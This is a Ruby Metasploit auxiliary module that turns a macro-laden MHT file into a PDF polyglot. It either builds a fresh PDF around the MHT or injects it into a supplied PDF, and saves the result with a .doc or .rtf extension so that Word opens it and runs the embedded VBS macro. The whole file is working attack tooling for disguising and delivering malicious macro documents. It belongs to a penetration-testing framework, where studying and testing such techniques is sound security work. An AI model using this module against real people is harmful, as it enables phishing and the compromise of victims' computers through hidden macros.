##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Maldoc in PDF Polyglot converter',
        'Description' => %q{
          A malicious MHT file created can be opened in Microsoft Word even though it has magic numbers and file
          structure of PDF.

          If the file has configured macro, by opening it in Microsoft Word, VBS runs and performs malicious behaviors.

          The attack does not bypass configured macro locks. And the malicious macros are also not executed when the
          file is opened in PDF readers or similar software.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'mekhalleh (RAMELLA Sebastien)' # module author powered by EXA Reunion (https://www.exa.re/)
        ],
        'Platform' => ['win'],
        'References' => [
          ['URL', 'https://blogs.jpcert.or.jp/en/2023/08/maldocinpdf.html'],
          ['URL', 'https://socradar.io/maldoc-in-pdf-a-novel-method-to-distribute-malicious-macros/'],
          ['URL', 'https://www.nospamproxy.de/en/maldoc-in-pdf-danger-from-word-files-hidden-in-pdfs/'],
          ['URL', 'https://github.com/exa-offsec/maldoc_in_pdf_polyglot/tree/main/demo']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptPath.new('FILENAME', [true, 'The input MHT filename with macro embedded']),
        OptPath.new('INJECTED_PDF', [false, 'The input PDF filename to inject in (optional)']),
        OptString.new('MESSAGE_PDF', [false, 'The message to display in the local PDF template (if INJECTED_PDF is NOT used)', 'You must open this document in Microsoft Word']),
        OptEnum.new('OUTPUT_EXT', [true, 'The output file extension', '.doc', ['.doc', '.rtf']])
      ]
    )
  end

  def create_pdf(mht)
    pdf = ''
    pdf << "#{rand_pdfheader}\r\n"

    # item 1 (catalog)
    pdf << "1 0 obj\r\n"
    pdf << "<< /Type /Catalog /Pages 2 0 R >>\r\n"
    pdf << "endobj\r\n"

    # item 2 (pages)
    pdf << "2 0 obj\r\n"
    pdf << "<< /Type /Pages /Kids [3 0 R] /Count 1 >>\r\n"
    pdf << "endobj\r\n"

    # item 3 (page with resources)
    pdf << "3 0 obj\r\n"
    pdf << "<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 5 0 R >> >> /MediaBox [0 0 612 792] /Contents 4 0 R >>\r\n"
    pdf << "endobj\r\n"

    # item 4 (content)
    content = "BT /F1 12 Tf 100 700 Td (#{datastore['MESSAGE_PDF']}) Tj ET\r\n"
    pdf << "4 0 obj\r\n"
    # exact stream length
    pdf << "<< /Length #{content.length} >>\r\n"
    pdf << "stream\r\n"
    pdf << content
    pdf << "endstream\r\n"
    pdf << "endobj\r\n"

    # item 5 (helvetica font)
    pdf << "5 0 obj\r\n"
    pdf << "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\r\n"
    pdf << "endobj\r\n"

    # item 6 (MHT content)
    pdf << "6 0 obj\r\n"
    pdf << "<< /Length #{mht.length} >>\r\n"
    pdf << "stream\r\n"
    pdf << mht
    pdf << "\r\nendstream\r\n"
    pdf << "endobj\r\n"

    # calculation of dynamic offsets
    offsets = []
    offsets << 0
    for i in 1..6 do
      offsets << pdf.index("#{i} 0 obj")
    end

    # XREF section
    xref_start = pdf.length
    pdf << "xref\r\n"
    # update for 7 objects (0-6)
    pdf << "0 7\r\n"
    pdf << "0000000000 65535 f\r\n"
    offsets[1..].each do |offset|
      pdf << format("%010d 00000 n\r\n", offset)
    end

    # trailer
    pdf << "trailer\r\n"
    # update for 7 objects (0-6)
    pdf << "<< /Size 7 /Root 1 0 R >>\r\n"
    pdf << "startxref\r\n"
    pdf << "#{xref_start}\r\n"
    pdf << "%%EOF\r\n"

    # saving the file
    ltype = "auxiliary.fileformat.#{shortname}"
    fname = File.basename(datastore['FILENAME'], '*') + datastore['OUTPUT_EXT']
    path = store_local(ltype, nil, pdf, fname)

    print_good("The file '#{fname}' is stored at '#{path}'")
  end

  def inject_pdf(pdf_path, mht)
    # read PDF in binary mode
    pdf_data = File.binread(pdf_path)
    vprint_status("PDF data length: #{pdf_data.length}")

    # find the position of 'startxref'
    startxref_index = pdf_data.rindex('startxref')
    unless startxref_index
      fail_with(Failure::Unknown, 'Invalid PDF: \'startxref\' not found')
    end

    xref_start_value = pdf_data[startxref_index..].match(/startxref\r?\n(\d+)/)[1].to_i
    vprint_status("PDF startxref value: #{xref_start_value}")
    vprint_status("PDF startxref position: #{startxref_index}")

    # extract the original objects
    original_objects = pdf_data[0...startxref_index]

    # build the MHT object as the first object (0 0 obj)
    mht_object = ''
    mht_object << "0 0 obj\r\n"
    mht_object << "<< /Length #{mht.length} >>\r\n"
    mht_object << "stream\r\n"
    mht_object << mht
    mht_object << "\r\nendstream\r\n"
    mht_object << "endobj\r\n"

    # combine: MHT first, then original items
    updated_objects = mht_object + original_objects

    # calculate offsets for XREF section
    offsets = []
    updated_objects.scan(/(\d+) 0 obj/) do |match|
      offsets << updated_objects.index("#{match[0]} 0 obj")
    end

    # build the XREF section
    xref = "xref\r\n"
    # includes free entry (0) and items
    xref << "0 #{offsets.size + 1}\r\n"
    # free entry
    xref << "0000000000 65535 f\r\n"
    offsets.each do |offset|
      xref << format("%010d 00000 n\r\n", offset)
    end

    # build the trailer
    xref_start_new = updated_objects.length
    trailer = "trailer\r\n"
    trailer << "<< /Size #{offsets.size + 1} /Root 1 0 R >>\r\n"
    trailer << "startxref\r\n"
    trailer << "#{xref_start_new}\r\n"
    trailer << "%%EOF\r\n"

    # assemble the final PDF
    headers = "#{rand_pdfheader}\r\n"
    pdf = headers + updated_objects + xref + trailer

    # saving the file
    ltype = "auxiliary.fileformat.#{shortname}"
    fname = File.basename(datastore['FILENAME'], '*') + datastore['OUTPUT_EXT']
    path = store_local(ltype, nil, pdf, fname)

    print_good("The file '#{fname}' is stored at '#{path}'")
  end

  def rand_pdfheader
    selected_version = ['1.0', '1.1', '1.2', '1.3', '1.4', '1.5', '1.6', '1.7', '2.0'].sample

    "%PDF-#{selected_version}"
  end

  def run
    content = File.read(datastore['FILENAME'])
    fail_with(Failure::BadConfig, 'The MHT file content is empty') if content&.empty?

    # if no pdf injected is provided, create new PDF from template
    if datastore['INJECTED_PDF'].blank?
      print_status('INJECTED_PDF not provided, creating the PDF from scratch')
      fail_with(Failure::BadConfig, 'No MESSAGE_PDF provided') if datastore['MESSAGE_PDF'].blank?

      create_pdf(content)
    else
      print_status("PDF creation using '#{File.basename(datastore['INJECTED_PDF'])}' as template")

      inject_pdf(datastore['INJECTED_PDF'], content)
    end
  end

end
